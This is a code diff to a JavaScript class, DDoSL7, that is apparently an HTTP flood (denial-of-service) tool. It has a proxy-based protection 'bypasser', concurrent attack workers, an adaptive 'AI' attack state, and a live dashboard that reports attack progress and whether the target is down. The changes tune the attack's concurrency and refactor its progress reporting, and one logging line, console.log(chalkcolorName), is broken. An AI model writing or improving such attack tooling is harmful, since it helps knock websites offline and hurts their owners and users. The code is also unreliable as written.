@@ -89,7 +89,7 @@ class DDoSL7 {
         this.io = io;
         this.isRunning = false;
         this.startTime = null;
-        this.concurrency = 1000;
+        this.concurrency = 500; // Dikurangi agar tidak mencekik Event Loop utama
         this.workers = [];
         this.bypasser = new Bypasser(this.io);
         this.bypasser.loadProxiesFromFile('proxies.txt');
@@ -215,14 +215,20 @@ class DDoSL7 {
             this.stats.bytesSent += msg.data.bytes || 0;
             Object.keys(msg.data.vectors).forEach(k => this.stats.vectors[k] += msg.data.vectors[k]);
             if (this.stats.requestsSent % 5000 === 0) {
-                const progress = DurationManager.getProgress(this.startTime, this.duration);
-                if (this.io) this.io.emit('attack_progress', { 
+                this.emitStats();
+            }
+        }
+    }
+
+    emitStats() {
+        const progress = DurationManager.getProgress(this.startTime, this.duration);
+        if (this.io) {
+            this.io.emit('attack_progress', { 
                     ...this.stats, 
                     progress, 
                     throughput: (this.stats.bytesSent / 1024 / 1024).toFixed(2) + ' MB',
                     aiState: this.ai.state 
                 });
-            }
         }
     }
 
@@ -243,15 +249,19 @@ class DDoSL7 {
                 });
                 const end = performance.now();
                 const latency = end - start;
-                if (this.io) this.io.emit('target_movement', {
-                    status: res.status,
-                    latency: latency.toFixed(2),
-                    timestamp: new Date().toLocaleTimeString()
-                });
                 this.ai.analyze(this.stats, latency);
+                
+                if (this.io) {
+                    this.io.emit('target_movement', {
+                        status: res.status,
+                        latency: latency.toFixed(2),
+                        timestamp: new Date().toLocaleTimeString(),
+                        url: this.target
+                    });
+                }
                 this.emitLog(`[AI:${this.ai.state}] HTTP ${res.status} | RTT: ${latency.toFixed(2)}ms`, 'success');
             } catch (err) {
-                if (this.io) this.io.emit('target_down', { url: this.target });
+                if (this.io) this.io.emit('target_down', { url: this.target, error: err.message });
             }
         }, 5000);
     }
@@ -587,8 +597,9 @@ class DDoSL7 {
     emitLog(msg, type) {
         const timestamp = new Date().toLocaleTimeString();
         const formattedMsg = `[${timestamp}] ${msg}`;
-        if (this.io) this.io.emit('log', { msg: formattedMsg, type });
         const colorName = type === 'error' ? 'red' : (type === 'success' ? 'green' : 'yellow');
+        
+        if (this.io) this.io.emit('log', { msg: formattedMsg, type });
         console.log(chalkcolorName);
     }
 
